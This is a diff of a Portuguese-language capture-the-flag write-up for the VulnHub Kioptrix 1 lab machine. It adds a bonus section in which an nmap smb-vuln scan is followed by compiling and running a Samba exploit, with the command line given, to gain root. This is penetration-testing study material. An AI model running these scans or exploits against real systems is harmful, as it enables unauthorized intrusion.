@@ -1,6 +1,6 @@
 ---
 title: "VulnHub - Kioptrix 1"
-tags: [Linux,Easy,Web,Gobuster]
+tags: [Linux,Easy,Web,Gobuster,Samba,Kernel]
 categories: VulnHub OSCP
 ---
 
@@ -104,6 +104,8 @@ Agora compilamos ele na nossa máquina
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/ssl3.png)
 
+# apache - root
+
 Executamos de acordo com as informações que temos da máquina e ganhamos um shell nela de apache
 
 ```bash
@@ -122,13 +124,44 @@ Compilamos ele na nossa máquina
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/exp3.png)
 
-# apache - root
-
 Agora executamos e viramos root
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/exp4.png)
 
 Outro modo de se escalar privilégio é pelo samba
+
+# Bônus
+
+Algo a mais é outro modo de se explorar essa máquina através do Samba que tem disponível nela, verificamos a versão que está sendo executado na porta 139
+
+```bash
+nmap --script smb-vuln* 192.168.56.143
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/samba.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/samba1.png)
+
+Pesquisamos por exploits para a versão do samba
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/s.png)
+
+Copiamos para a máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/s1.png)
+
+Compilamos ele
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/s2.png)
+
+Executamos e viramos root
+
+```bash
+./exploit -b 0 -c 192.168.56.102 192.168.56.143
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1/s3.png)
+
 
 
 
